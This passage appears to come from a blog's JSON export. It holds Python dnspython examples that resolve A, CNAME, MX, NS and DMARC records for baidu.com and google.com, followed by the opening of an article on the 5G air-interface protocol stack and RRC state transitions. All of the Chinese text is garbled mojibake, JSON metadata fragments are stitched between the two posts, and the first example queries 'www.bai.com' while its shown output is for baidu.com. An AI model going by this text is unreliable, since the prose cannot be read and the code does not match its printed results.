å¦‚æœä¸çŸ¥é“è¿”å›çš„Re ç»“æœæ€ä¹ˆå–å€¼ï¼Œ å¯ä»¥é€šè¿‡ print(re.__dict__) æŸ¥çœ‹è¿”å›ç»“æœçš„å†…ç½®å¯¹è±¡ æˆ–è€…print(dir(re)) ''' import dns if __name__ == '__main__': re = dns.resolver.query(\"www.bai.com\",\"A\") print(re.__dict__) print(\"&#123;:-^50s&#125;\".format(\"åä¸½çš„åˆ†å‰²çº¿1\")) for i in re.rrset: print(i) print(\"&#123;:-^50s&#125;\".format(\"åä¸½çš„åˆ†å‰²çº¿2\")) for i in re.response.answer: for j in i.items: print(j.to_text()) ''' output: &#123;'qname': &lt;DNS name baidu.com.>, 'rdtype': 1, 'rdclass': 1, 'response': &lt;DNS message, ID 22745>, 'canonical_name': &lt;DNS name baidu.com.>, 'rrset': &lt;DNS baidu.com. IN A RRset>, 'expiration': 1637812232.3766685&#125; ---------------------åä¸½çš„åˆ†å‰²çº¿1---------------------- 220.181.38.148 220.181.38.251 ---------------------åä¸½çš„åˆ†å‰²çº¿2---------------------- 220.181.38.148 220.181.38.251 ''' è§£æ CNAMEè®°å½• import dns if __name__ == '__main__': re = dns.resolver.query(\"www.baidu.com\",'CNAME') print(re.__dict__) print(\"&#123;:-^50s&#125;\".format(\"åä¸½çš„åˆ†å‰²çº¿1\")) for i in re.rrset: print(i.to_text().replace('\\\"','')) print(\"&#123;:-^50s&#125;\".format(\"åä¸½çš„åˆ†å‰²çº¿2\")) for i in re.response.answer: for j in i.items: print(j.to_text()) print(\"&#123;:-^50s&#125;\".format(\"åä¸½çš„åˆ†å‰²çº¿3\")) for i in re: print(i.to_text()) ''' output: &#123;'qname': &lt;DNS name www.baidu.com.>, 'rdtype': 5, 'rdclass': 1, 'response': &lt;DNS message, ID 21322>, 'canonical_name': &lt;DNS name www.baidu.com.>, 'rrset': &lt;DNS www.baidu.com. IN CNAME RRset>, 'expiration': 1637813064.512025&#125; ---------------------åä¸½çš„åˆ†å‰²çº¿1---------------------- www.a.shifen.com. ---------------------åä¸½çš„åˆ†å‰²çº¿2---------------------- www.a.shifen.com. ---------------------åä¸½çš„åˆ†å‰²çº¿3---------------------- www.a.shifen.com. ''' è§£æ MXè®°å½• import dns if __name__ == '__main__': re = dns.resolver.query(\"baidu.com\",\"MX\") print(re.__dict__) print(\"&#123;:-^50s&#125;\".format(\"åä¸½çš„åˆ†å‰²çº¿1\")) for i in re.rrset: print(i) print(\"&#123;:-^50s&#125;\".format(\"åä¸½çš„åˆ†å‰²çº¿2\")) for i in re.response.answer: for j in i.items: print(j.to_text()) print(\"&#123;:-^50s&#125;\".format(\"åä¸½çš„åˆ†å‰²çº¿3\")) for i in re: print('MX preference =', i.preference, 'mail exchanger =', i.exchange) ''' output: &#123;'qname': &lt;DNS name baidu.com.>, 'rdtype': 15, 'rdclass': 1, 'response': &lt;DNS message, ID 47237>, 'canonical_name': &lt;DNS name baidu.com.>, 'rrset': &lt;DNS baidu.com. IN MX RRset>, 'expiration': 1637817511.307147&#125; ---------------------åä¸½çš„åˆ†å‰²çº¿1---------------------- 20 mx1.baidu.com. 15 mx.n.shifen.com. 20 mx50.baidu.com. 20 usmx01.baidu.com. 20 jpmx.baidu.com. 10 mx.maillb.baidu.com. ---------------------åä¸½çš„åˆ†å‰²çº¿2---------------------- 20 mx1.baidu.com. 15 mx.n.shifen.com. 20 mx50.baidu.com. 20 usmx01.baidu.com. 20 jpmx.baidu.com. 10 mx.maillb.baidu.com. ---------------------åä¸½çš„åˆ†å‰²çº¿3---------------------- MX preference = 20 mail exchanger = mx1.baidu.com. MX preference = 15 mail exchanger = mx.n.shifen.com. MX preference = 20 mail exchanger = mx50.baidu.com. MX preference = 20 mail exchanger = usmx01.baidu.com. MX preference = 20 mail exchanger = jpmx.baidu.com. MX preference = 10 mail exchanger = mx.maillb.baidu.com. ''' è§£æ NSè®°å½• import dns if __name__ == '__main__': re = dns.resolver.query(\"baidu.com\",\"NS\") print(re.__dict__) print(\"&#123;:-^50s&#125;\".format(\"åä¸½çš„åˆ†å‰²çº¿1\")) for i in re.rrset: print(i) print(\"&#123;:-^50s&#125;\".format(\"åä¸½çš„åˆ†å‰²çº¿2\")) for i in re.response.answer: for j in i.items: print(j.to_text()) print(\"&#123;:-^50s&#125;\".format(\"åä¸½çš„åˆ†å‰²çº¿3\")) for i in re: print(i.to_text()) ''' output: &#123;'qname': &lt;DNS name baidu.com.>, 'rdtype': 2, 'rdclass': 1, 'response': &lt;DNS message, ID 64405>, 'canonical_name': &lt;DNS name baidu.com.>, 'rrset': &lt;DNS baidu.com. IN NS RRset>, 'expiration': 1637815874.9459918&#125; ---------------------åä¸½çš„åˆ†å‰²çº¿1---------------------- dns.baidu.com. ns4.baidu.com. ns3.baidu.com. ns7.baidu.com. ns2.baidu.com. ---------------------åä¸½çš„åˆ†å‰²çº¿2---------------------- dns.baidu.com. ns4.baidu.com. ns3.baidu.com. ns7.baidu.com. ns2.baidu.com. ---------------------åä¸½çš„åˆ†å‰²çº¿3---------------------- dns.baidu.com. ns4.baidu.com. ns3.baidu.com. ns7.baidu.com. ns2.baidu.com. Process finished with exit code 0 ''' è§£æ DMARC è®°å½• import dns if __name__ == '__main__': re = dns.resolver.query(\"_dmarc.\"+\"google.com\",\"TXT\") print(re.__dict__) print(\"&#123;:-^50s&#125;\".format(\"åä¸½çš„åˆ†å‰²çº¿1\")) for i in re.rrset: print(i.to_text().replace('\\\"','')) print(\"&#123;:-^50s&#125;\".format(\"åä¸½çš„åˆ†å‰²çº¿2\")) for i in re.response.answer: for j in i.items: print(j.to_text()) print(\"&#123;:-^50s&#125;\".format(\"åä¸½çš„åˆ†å‰²çº¿3\")) for i in re: print(i.to_text()) ''' output: ---------------------åä¸½çš„åˆ†å‰²çº¿1---------------------- v=DMARC1; p=reject; rua=mailto:mailauth-reports@google.com ---------------------åä¸½çš„åˆ†å‰²çº¿2---------------------- \"v=DMARC1; p=reject; rua=mailto:mailauth-reports@google.com\" ---------------------åä¸½çš„åˆ†å‰²çº¿3---------------------- \"v=DMARC1; p=reject; rua=mailto:mailauth-reports@google.com\" '''","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"python","slug":"æŠ€æœ¯å‘/python","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/python/"}],"tags":[{"name":"python","slug":"python","permalink":"https://www.sizaif.com/tags/python/"},{"name":"DNS","slug":"DNS","permalink":"https://www.sizaif.com/tags/DNS/"}],"author":"sizaif"},{"title":"5Gç©ºå£åè®®æ ˆ","slug":"5Gç©ºå£åè®®æ ˆ","date":"2021-11-14T07:23:13.000Z","updated":"2021-11-17T08:22:59.000Z","comments":true,"path":"posts/f5bfc31f/","link":"","permalink":"https://www.sizaif.com/posts/f5bfc31f/","excerpt":"","text":"5G ç©ºå£åè®®æ ˆ create date: 2021-10-28 09:03:43 [TOC] ä¸€ã€ç©ºå£åè®®æ ˆæ¦‚è¿° ï¼ˆä¸€ï¼‰ã€æ§åˆ¶é¢ â— å±‚ä¸‰ NASï¼šä¼šè¯ç®¡ç†ã€ç”¨æˆ·ç®¡ç†ã€å®‰å…¨ç®¡ç†ã€è®¡è´¹ã€‚ RRCï¼šç³»ç»Ÿæ¶ˆæ¯ã€å‡†å…¥æ§åˆ¶ã€å®‰å…¨ç®¡ç†ã€æµ‹é‡ä¸ä¸ŠæŠ¥ã€åˆ‡æ¢å’Œç§»åŠ¨æ€§ã€NASæ¶ˆæ¯ä¼ è¾“ã€æ— çº¿èµ„æºç®¡ç†ã€‚ â— å±‚äºŒ å¯¹ä¸åŒçš„å±‚ä¸‰æ•°æ®è¿›è¡ŒåŒºåˆ†æ ‡è¯†ï¼Œå¹¶æä¾›ä¸åŒçš„æœåŠ¡ PDCPï¼ˆåˆ†ç»„æ•°æ®æ±‡èšåè®®å±‚ï¼‰ï¼šä¼ è¾“ç”¨æˆ·é¢å’Œæ§åˆ¶é¢æ•°æ®ã€ç»´æŠ¤PDCPçš„SNå·ã€è·¯ç”±å’Œé‡å¤ï¼ˆåŒè¿æ¥åœºæ™¯ï¼‰ã€åŠ å¯†/è§£å¯†å’Œå®Œæ•´æ€§ä¿æŠ¤ã€é‡æ’åºã€æ”¯æŒä¹±åºé€’äº¤ã€ é‡å¤ä¸¢å¼ƒã€ROHCï¼ˆç”¨æˆ·é¢ï¼‰ã€‚ RLCï¼ˆæ— çº¿é“¾è·¯æ§åˆ¶å±‚ï¼‰ï¼šæ£€é”™ã€çº é”™ARQï¼ˆAMå®ä½“ï¼‰ï¼›åˆ†æ®µé‡ç»„ï¼ˆUMå®ä½“å’ŒAMå®ä½“ï¼‰ï¼›é‡åˆ†æ®µï¼ˆAMå®ä½“ï¼‰ï¼›é‡å¤åŒ…æ£€æµ‹ï¼ˆAMå®ä½“ï¼‰ã€‚ MACï¼ˆåª’ä½“æ¥å…¥å±‚ï¼‰ï¼šé€»è¾‘ä¿¡é“å’Œä¼ è¾“ä¿¡é“ä¹‹é—´çš„æ˜ å°„ã€å¤ç”¨/è§£å¤ç”¨ã€è°ƒåº¦ã€HARQã€é€»è¾‘ä¿¡é“ä¼˜å…ˆçº§è®¾ç½®ã€‚ â— å±‚ä¸€ ç‰©ç†å±‚ä¸ºé«˜å±‚çš„æ•°æ®æä¾›æ— çº¿èµ„æºåŠç‰©ç†å±‚çš„å¤„ç† PHYï¼ˆç‰©ç†å±‚ï¼‰ åœºæ™¯ç¼–ç ï¼šæ§åˆ¶ä¿¡é“Polarç ï¼Œä¸šåŠ¡ä¿¡é“LDPCç ï¼› è°ƒåˆ¶ï¼šQPSKã€16QAMã€64QAMã€256QAMï¼› massiveMIMOï¼šè¯¦è§ç¬¬1éƒ¨åˆ†-massiveMIMOæ¦‚è¿° ï¼ˆäºŒï¼‰ã€ç”¨æˆ·é¢ â— å±‚äºŒå¢åŠ SDAPå±‚(Service Data Adaptation Protocol,æœåŠ¡æ•°æ®é€‚é…åè®®) åœ¨SAç»„ç½‘ä¸‹ï¼Œ4Gç½‘ç»œä¸­çš„æ— çº¿æ‰¿è½½çš„æ¦‚å¿µä¾ç„¶è¢«æ²¿ç”¨ï¼Œä½†5Gæ ¸å¿ƒç½‘ä¸ºäº†ä½¿ä¸šåŠ¡å®ç°æ›´åŠ çš„ç²¾ç»†åŒ–ï¼Œ5Gçš„åŸºæœ¬ä¸šåŠ¡çš„ä¼ è¾“å•ä½ä»4Gæ—¶ä»£æ‰¿è½½çš„æ¦‚å¿µç»†åŒ–åˆ°ä»¥QoS Flowã€‚SDAPåè®®æ ˆåŠŸèƒ½å°±æ˜¯å®Œæˆæ— çº¿ä¾§çš„æ‰¿è½½ï¼ˆDRBï¼‰ä¸5GCä¸­çš„QoSFlowè¿›è¡Œæ˜ å°„ äºŒã€RRCå±‚åŠŸèƒ½ä»‹ç» RRCï¼ˆRadio Resource Controlï¼Œæ— çº¿èµ„æºæ§åˆ¶ï¼‰å±‚ï¼Œæ˜¯æ•´ä¸ªæ— çº¿é€šä¿¡åè®®æ ˆæ¥å…¥å±‚çš„æ¶ˆæ¯é…ç½®ä¸­å¿ƒåŠæ§åˆ¶ä¸­å¿ƒï¼Œå…¶é‡è¦æ€§ä¸è¨€è€Œå–»ã€‚RRCå±‚çš„ä¸»è¦ä½œç”¨æ˜¯ç»™å…¶ä¸‹å±‚ï¼ˆPDCP,RLC,MAC,PHYï¼‰æ§åˆ¶å’Œé…ç½®æ‰€æœ‰æ— çº¿èµ„æºï¼Œä»è€Œå¯ä»¥ä½¿UEä¸åŸºç«™ä¹‹é—´è¿›è¡Œé€šä¿¡ã€‚ ï¼ˆä¸€ï¼‰ã€åŠŸèƒ½ RRCå±‚ä½äºPDCPå±‚ä¹‹ä¸Šï¼ŒåŠŸèƒ½å’ŒLTEåŸºæœ¬ä¸€è‡´ ç³»ç»Ÿæ¶ˆæ¯ å‡†å…¥æ§åˆ¶ å®‰å…¨ç®¡ç† æµ‹é‡ä¸ä¸ŠæŠ¥ åˆ‡æ¢å’Œç§»åŠ¨æ€§ NASæ¶ˆæ¯ä¼ è¾“ æ— é™èµ„æºç®¡ç† ï¼ˆäºŒï¼‰ã€RRCçŠ¶æ€ â— Connected/IDEL LTEæ—¶ä»…æœ‰è¿™ä¸¤ä¸ªçŠ¶æ€ï¼Œç”¨æˆ·è¦ä¼ æ•°æ®å¿…é¡»åœ¨RRC_C0NNECTEDçŠ¶æ€ï¼Œå› ä¸ºè¯¥çŠ¶æ€ä¸‹å„ä¸ªèŠ‚ç‚¹ä¹‹é—´çš„é€šé“éƒ½éœ€è¦æ‰“é€šï¼›IDELçŠ¶æ€æ˜¯ä¸åŸºç«™çš„èµ„æºï¼ˆDRBæ‰¿è½½ã€S1æ‰¿è½½ï¼‰éƒ½è¦é‡Šæ”¾ï¼Œè€Œæ ¸å¿ƒç½‘èµ„æºä¿ç•™ã€‚ä¸¤ç§çŠ¶æ€é€šè¿‡å¯»å‘¼å’ŒRRCé‡Šæ”¾è½¬æ¢ã€‚5Gä¸¤ç§çŠ¶æ€ä¸LTEä¸€è‡´ã€‚ â— Inactive ç›¸å¯¹äºLTEï¼ŒNRæ–°å¢äº†InactiveçŠ¶æ€ã€‚åœ¨è¯¥çŠ¶æ€ä¸‹UEå­˜å‚¨ASä¸Šä¸‹æ–‡ä¿¡æ¯ï¼Œç›‘å¬å¯»å‘¼ä»¥åŠæ‰§è¡Œå°åŒºé‡é€‰æµç¨‹ã€‚åœ¨RRC InactiveçŠ¶æ€ä¸‹ï¼ŒUEå’ŒgNBåªä¼šç»´æŒRRCå’ŒPDCPå±‚çš„é“¾æ¥ï¼ŒgNBå’ŒUEä¼šé‡Šæ”¾C-RNTIä¸Šä¸‹æ–‡ï¼›ä¸ºäº†æ ‡è¯†ç”¨æˆ·ï¼ŒgNBå’ŒUEä¾§ä¼šæ–°å»ºç«‹I-RNTIç”¨äºç”¨æˆ·çš„æ ‡è¯†ã€‚ä»…é‡Šæ”¾ç©ºå£èµ„æºï¼Œç®€åŒ–äº†RRCçŠ¶æ€è½¬æ¢çš„æµç¨‹ï¼ŒèŠ‚çœäº†ç”¨æˆ·è¿”å›é“¾æ¥æ€çš„æ—¶å»¶ï¼Œå‡å°‘äº†ä¿¡ä»¤å¼€é”€ï¼Œä½†ç°ç½‘å°šæœªå¯ç”¨ã€‚ ï¼ˆä¸‰ï¼‰ã€å®šä¹‰RNAï¼ˆRAN-Based Notification Areaï¼‰ RNAå¯ä»¥è¦†ç›–ä¸€ä¸ªåŸºç«™æˆ–è€…å¤šä¸ªåŸºç«™ï¼Œä½†ä¸€å®šè¦åœ¨æ ¸å¿ƒç½‘é…ç½®çš„æ³¨å†ŒåŒºèŒƒå›´å†… å½“UEçš„RNAå®šæ—¶å™¨è¶…æ—¶æˆ–è€…UEç§»åŠ¨å‡ºäº†RNAèŒƒå›´æ—¶ï¼ŒUEéƒ½è¦å‘èµ·RANUï¼ˆRAN-based notification area updateï¼‰æµç¨‹ å…³äºå¦‚ä½•é…ç½®RNAæœ‰å‡ ç§ä¸åŒçš„é€‰æ‹©ï¼š -å°åŒºåˆ—è¡¨ï¼š â€“gNBç»™UEæä¾›ä¸€ä¸ªæ˜ç¡®çš„å°åŒºåˆ—è¡¨ä½œä¸ºRNAã€‚ -RAN areaåˆ—è¡¨ï¼š â€“gNBç»™UEæä¾›ä¸€ä¸ªRAN area IDåˆ—è¡¨ä½œä¸ºRNAï¼Œè¿™é‡Œæä¾›çš„RAN areaæ˜¯CN Tracking Areaçš„ä¸€ä¸ªå­é›†æˆ–è€…ç­‰äºCN Tracking Areaï¼Œä¸€ä¸ªRAN areaå¯¹åº”ä¸€ä¸ªRAN area IDï¼Œä¸€ä¸ªRAN areaç”±TAIå’Œä¸€ä¸ªå¯é€‰çš„RAN area Codeç»„æˆã€‚ â€“ä¸€ä¸ªå°åŒºä¼šåœ¨å…¶ç³»ç»Ÿæ¶ˆæ¯å¹¿æ’­å®ƒçš„RAN area IDã€‚ å‚è€ƒï¼šTS23.501ã€TS38.413 â— å½“UEå¤„äºRRC_INACTIVEæ—¶ï¼Œå¦‚æœæœ€åä¸€ä¸ªæœåŠ¡gNBæ”¶åˆ°æ¥è‡ªUPFçš„ä¸‹è¡Œæ•°æ®æˆ–è€…æ¥è‡ªAMFçš„ä¸‹è¡Œä¿¡ä»¤ï¼Œåˆ™è¯¥gNBåœ¨RNAçš„æ‰€æœ‰å°åŒºå¯»å‘¼UEï¼Œå¦‚æœRNAçš„å°åŒºå±äºé‚»gNBçš„ï¼Œåˆ™é€šè¿‡Xnå£ç»™å¯¹åº”çš„é‚»gNBå‘é€XnAP-RAN-Pagingæ¶ˆæ¯ã€‚å¦‚æœRANå¯»å‘¼å¤±è´¥ï¼Œåˆ™ã€è§äºTS23.501 5.3.3.2.5ã€‘ï¼š å¦‚æœNG-RANæœ‰NAS PDUè¦å‘ç»™UEï¼Œåˆ™RANèŠ‚ç‚¹åº”è¯¥å‘èµ·AN Releaseæµç¨‹é‡Šæ”¾UEçš„N2å£è¿æ¥ï¼Œå°†UEçš„CMçŠ¶æ€è¿ç§»åˆ°CM_IDLEçŠ¶æ€ã€‚ å¦‚æœNG-RANä»…ä»…åªæœ‰ç”¨æˆ·é¢æ•°æ®è¦å‘é€ç»™UEï¼Œåˆ™NG-RANèŠ‚ç‚¹å¯ä»¥ç»§ç»­ä¿ç•™N2è¿æ¥æˆ–è€…å‘èµ·AN Releaseæµç¨‹é‡Šæ”¾N2å£è¿æ¥ï¼Œå¦‚ä½•é€‰æ‹©å–å†³äºNG-RANçš„æœ¬åœ°é…ç½®ã€‚ æ³¨ï¼šåœ¨RANå¯»å‘¼å¤±è´¥æ—¶è§¦å‘RANå¯»å‘¼çš„ç”¨æˆ·é¢æ•°æ®åŒ…å¯èƒ½ä¼šä¸¢å¤±ã€‚ â— AMFç»™NG-RANæä¾›RRC Inactive Assistance Informationï¼Œä»¥ä¾›NG-RANç”¨äºå†³å®šUEæ˜¯å¦å¯ä»¥è¿›å…¥RRC_INACTIVEçŠ¶æ€ï¼›è¿™ä¸ªRRC Inactive Assistance Informationä¿¡æ¯åŒ…æ‹¬ï¼šé…ç½®ç»™UEçš„æ³¨å†ŒåŒºã€UEç‰¹å®šçš„DRXã€å‘¨æœŸæ³¨å†Œå®šæ—¶å™¨ã€MICOæŒ‡ç¤ºã€UE id indexå€¼ç­‰ã€‚ â— RNAæ›´æ–°æµç¨‹ â— UEè§¦å‘çš„RNAæ›´æ–°è¿‡ç¨‹ï¼ŒåŒ…æ‹¬åœ¨Xnæ¥å£ä¸Šçš„ä¸Šä¸‹æ–‡æ£€ç´¢ã€‚è¿™ä¸ªè¿‡ç¨‹å¯èƒ½ä¼šåœ¨UEç§»åŠ¨å‡ºæ‰€é…ç½®çš„RNAæ—¶è§¦å‘ï¼Œæˆ–è€…å‘¨æœŸæ€§åœ°è§¦å‘ã€‚ UEä»RRC_INACTIVEçŠ¶æ€æ¢å¤ï¼Œæä¾›ç”±æœ€åæœåŠ¡çš„gNBåˆ†é…çš„I-RNTIå’Œé€‚å½“çš„åŸå› å€¼ï¼Œä¾‹å¦‚RNAæ›´æ–°ã€‚ å¦‚æœgNBèƒ½å¤Ÿè§£æI-RNTIä¸­åŒ…å«çš„gNBæ ‡è¯†ï¼Œåˆ™è¯·æ±‚æœ€åæœåŠ¡çš„gNBæä¾›UEä¸Šä¸‹æ–‡ï¼Œæä¾›æ­¥éª¤1ä¸­æ¥æ”¶åˆ°çš„åŸå› å€¼ã€‚ æœ€åæœåŠ¡çš„gNBå¯ä»¥æä¾›UEä¸Šä¸‹æ–‡(å¦‚ä¸‹æ‰€è¿°)ã€‚å¦å¤–,æœ€åæœåŠ¡gNBå¯èƒ½å†³å®šæŠŠé—®é¢˜è½¬ç§»åˆ°RRC_IDLE(ä¸”ç¨‹åºéµå¾ªæ­¥éª¤3å’Œå›¾9.2.2.5-3ä¹‹å),æˆ–è€…å¦‚æœé—®é¢˜ä»åœ¨å‰é¢é…ç½®çš„RNA,ä½¿é—®é¢˜è¿‡å»æœåŠ¡ä¸Šä¸‹æ–‡gNBå’Œä¿æŒé—®é¢˜RRC_INACTIVE(ä¸”ç¨‹åºéµå¾ªæ­¥éª¤3å’Œå›¾9.2.2.5-2ä¹‹å)ã€‚ gNBå¯ä»¥å°†UEè½¬ç§»åˆ°RRC_CONNECTEDçŠ¶æ€ï¼Œæˆ–è€…ä½¿UEé‡å›RRC_IDLEæ€(è¿™ç§æƒ…å†µä¸‹ï¼ŒgNBå‘é€ä¸€æ¡RRCReleaseæ¶ˆæ¯)ï¼Œæˆ–è€…ä½¿UEè¿”å›RRC_INACTIVEï¼Œå¦‚ä¸‹å‡å®šã€‚ å¦‚æœè¦é˜²æ­¢åœ¨æœ€åæœåŠ¡gNBä¸­ç¼“å†²çš„ä¸‹è¡Œç”¨æˆ·æ•°æ®çš„ä¸¢å¤±ï¼Œåˆ™æ¥å…¥çš„gNBç»™æœ€åæœåŠ¡gNBæä¾›ä¸‹è¡Œæ•°æ®è½¬å‘åœ°å€ 6/7. gNBè¿›è¡Œè·¯å¾„åˆ‡æ¢ï¼ˆå‘æœåŠ¡AMFå‘è·¯å¾„åˆ‡æ¢è¯·æ±‚æ¶ˆæ¯ï¼ŒAMFå›å¤è·¯å¾„åˆ‡æ¢å“åº”æ¶ˆæ¯ ï¼‰ gNBé€šè¿‡å‘é€å¸¦æœ‰æŒ‚èµ·æŒ‡ç¤ºçš„RRCReleaseæ¥ä½¿ç»ˆç«¯å¤„äºRRC_INACTIVEçŠ¶æ€ é€šçŸ¥æœ€åæœåŠ¡çš„gNBé‡Šæ”¾UEä¸Šä¸‹æ–‡ â— å½“UEä»ç„¶åœ¨æ‰€é…ç½®çš„RNAï¼Œå¹¶ä¸”æœ€åæœåŠ¡çš„gNBåˆ¤å®šä¸é‡æ–°å®šä½UEä¸Šä¸‹æ–‡ï¼Œå¹¶ä¿æŒUEåœ¨RRC_INACTIVEçš„æƒ…å†µä¸‹çš„RNAæ›´æ–°è¿‡ç¨‹ UEä»RRC_INACTIVEçŠ¶æ€æ¢å¤ï¼Œæä¾›ç”±æœ€åæœåŠ¡çš„gNBåˆ†é…çš„I-RNTIå’Œé€‚å½“çš„åŸå› å€¼ï¼Œä¾‹å¦‚RNAæ›´æ–°ã€‚ å¦‚æœgNBèƒ½å¤Ÿè§£æI-RNTIä¸­åŒ…å«çš„gNBæ ‡è¯†ï¼Œåˆ™è¯·æ±‚æœ€åæœåŠ¡çš„gNBæä¾›UEä¸Šä¸‹æ–‡ï¼Œæä¾›æ­¥éª¤1ä¸­æ¥æ”¶åˆ°çš„åŸå› å€¼ã€‚ æœ€åæä¾›æœåŠ¡çš„gNBå­˜å‚¨æ¥æ”¶åˆ°çš„ç”¨äºä¸‹æ¬¡å°è¯•æ¢å¤çš„æ¶ˆæ¯(ä¾‹å¦‚ä¸è¦æ¢å¤å°åŒºç›¸å…³çš„C-RNTIå’ŒPCI)ï¼Œå¹¶ä»¥æ£€ç´¢UEä¸Šä¸‹æ–‡å¤±è´¥æ¶ˆæ¯(åŒ…æ‹¬å°è£…çš„RRCReleaseæ¶ˆæ¯)å“åº”gNBã€‚RRCReleaseæ¶ˆæ¯åŒ…æ‹¬æš‚åœæŒ‡ç¤ºã€‚ gNBå°†RRCReleaseæ¶ˆæ¯è½¬å‘åˆ°UEã€‚ â— å½“æœ€åæœåŠ¡çš„gNBå†³å®šç§»åŠ¨ç»ˆç«¯åˆ°RRC_IDLEçš„æƒ…å†µä¸‹çš„RNAæ›´æ–°è¿‡ç¨‹ UEä»RRC_INACTIVEçŠ¶æ€æ¢å¤ï¼Œæä¾›ç”±æœ€åæœåŠ¡çš„gNBåˆ†é…çš„I-RNTIå’Œé€‚å½“çš„åŸå› å€¼ï¼Œä¾‹å¦‚RNAåŸŸæ›´æ–°ã€‚ å¦‚æœgNBèƒ½å¤Ÿè§£æI-RNTIä¸­åŒ…å«çš„gNBæ ‡è¯†ï¼Œåˆ™è¯·æ±‚æœ€åæœåŠ¡çš„gNBæä¾›UEä¸Šä¸‹æ–‡ï¼Œæä¾›æ­¥éª¤1ä¸­æ¥æ”¶åˆ°çš„åŸå› å€¼ã€‚ æœ€åæœåŠ¡çš„gNBæä¾›ä¸€æ¡RRC Releaseæ¶ˆæ¯ï¼Œä½¿UEè½¬æ¢åˆ°RRC_IDLEçŠ¶æ€ï¼Œè€Œä¸æä¾›UEä¸Šä¸‹æ–‡ã€‚ æœ€åæœåŠ¡çš„gNBåˆ é™¤UEä¸Šä¸‹æ–‡ã€‚ gNBå‘é€RRC Releaseæ¶ˆæ¯ï¼Œè§¦å‘è½¬æ¢åˆ°RRC_IDLEçŠ¶æ€ã€‚ ï¼ˆå››ï¼‰ã€çŠ¶æ€è½¬æ¢ RRC_CONNECTED å’Œ RRC_INACTIVEå¯ä»¥äº’ç›¸è½¬æ¢ ï¼›RRC_CONNECTED å’Œ RRC_IDLEå¯ä»¥äº’ç›¸è½¬æ¢ ï¼›RRC_INACTIVE åªèƒ½å•å‘é‡Šæ”¾èµ„æºè½¬æ¢åˆ°RRC_IDLE å‚è€ƒï¼šTS38.300ã€TS38.331 â— RRC_CONNECTED to RRC_INACTIVE é€šè¿‡å®šæ—¶å™¨è¶…æ—¶è§¦å‘ï¼ˆT380ï¼‰ â— RRC_INACTIVE to RRC_IDLE é€šè¿‡å®šæ—¶å™¨è¶…æ—¶è§¦å‘ï¼ˆä¸€èˆ¬æ˜¯1500sï¼‰ â— RRC_INACTIVE to RRC_CONNECTED UEå‘èµ·ï¼šUEä¸Šä¸‹æ–‡æ£€ç´¢æˆåŠŸçŠ¶æ€ä¸‹ï¼šUEè§¦å‘ä»RRC_INACTIVEåˆ°RRC_CONNECTEDçš„è½¬æ¢ 1.UEä»RRC_INACTIVEæ¢å¤ï¼Œæä¾›ç”±æœ€åæœåŠ¡gNBåˆ†é…çš„I-RNTI 2.å¦‚æœèƒ½å¤Ÿè§£æI-RNTIä¸­åŒ…å«çš„gNBèº«ä»½ï¼Œåˆ™gNBè¯·æ±‚æœ€åæœåŠ¡gNBæä¾›UEä¸Šä¸‹æ–‡æ•°æ® 3.æœ€åæœåŠ¡gNBæä¾›UEä¸Šä¸‹æ–‡æ•°æ® 4/5.gNBå®ŒæˆRRCè¿æ¥çš„æ¢å¤ æ³¨æ„:å¦‚æœæˆæƒå…è®¸ï¼Œç”¨æˆ·æ•°æ®ä¹Ÿå¯ä»¥åœ¨æ­¥éª¤5ä¸­å‘é€ 6.å¦‚æœè¦é˜²æ­¢åœ¨æœ€åæœåŠ¡gNBä¸­ç¼“å†²çš„ä¸‹è¡Œç”¨æˆ·æ•°æ®çš„ä¸¢å¤±ï¼Œåˆ™æ¥å…¥çš„gNBç»™æœ€åæœåŠ¡gNBæä¾›ä¸‹è¡Œæ•°æ®è½¬å‘åœ°å€ 7/8.gNBæ‰§è¡Œè·¯å¾„åˆ‡æ¢ï¼ˆå‘æœåŠ¡AMFå‘è·¯å¾„åˆ‡æ¢è¯·æ±‚æ¶ˆæ¯,AMFå›å¤è·¯å¾„åˆ‡æ¢å“åº”æ¶ˆæ¯ ï¼‰ 9.é€šçŸ¥æœ€åæœåŠ¡gNBé‡Šæ”¾UEçš„èµ„æº UEå‘èµ·ï¼šUEä¸Šä¸‹æ–‡æ£€ç´¢å¤±è´¥çŠ¶æ€ä¸‹ï¼šUEè§¦å‘ä»RRC_INACTIVEåˆ°RRC_CONNECTEDçš„è½¬æ¢ \\1. UEä»RRC_INACTIVEæ¢å¤ï¼Œæä¾›I-RNTIï¼Œç”±æœ€åæœåŠ¡çš„gNBåˆ†é…ã€‚ \\2. å¦‚æœgNBèƒ½å¤Ÿè§£æI-RNTIä¸­åŒ…å«çš„gNBæ ‡è¯†ï¼Œå°±è¯·æ±‚æœ€åæœåŠ¡çš„gNBæä¾›UEä¸Šä¸‹æ–‡æ•°æ®ã€‚ \\3. æœ€åä¸€ä¸ªæœåŠ¡çš„gNBæ— æ³•æ£€ç´¢æˆ–éªŒè¯ç»ˆç«¯ä¸Šä¸‹æ–‡æ•°æ®ã€‚ \\4. æœ€åä¸€æ¬¡æœåŠ¡çš„gNBå‘gNBè¿”å›å¤±è´¥ä¿¡æ¯ã€‚ \\5. gNBæ‰§è¡Œå›é€€ï¼Œé€šè¿‡å‘é€RRCSetupæ¥å»ºç«‹æ–°çš„RRCè¿æ¥ã€‚ \\6. å»ºç«‹æ–°çš„RRC Connectionã€‚ ç½‘ç»œæ‹’ç»ï¼šç»ˆç«¯è¯•å›¾ä»RRC_INACTIVEæ¢å¤è¿æ¥æ—¶ï¼Œç½‘ç»œæ‹’ç»çš„æƒ…å†µ \\1. UEå°è¯•ä»RRC_INACTIVEæ¢å¤è¿æ¥ã€‚ \\2. gNBæ— æ³•å¤„ç†è¿™ä¸ªæµç¨‹ï¼Œä¾‹å¦‚ç”±äºæ‹¥å¡ã€‚ \\3. gNBå‘é€RRCReject(å¸¦æœ‰ç­‰å¾…æ—¶é—´ä¿¡æ¯)æ¥ä¿æŒUEå¤„äºRRC_INACTIVEçŠ¶æ€ã€‚ ç½‘ç»œå‘èµ·ï¼šç½‘ç»œè§¦å‘çš„ä»RRC_INACTIVEåˆ°RRC_CONNECTEDçš„è½¬æ¢ 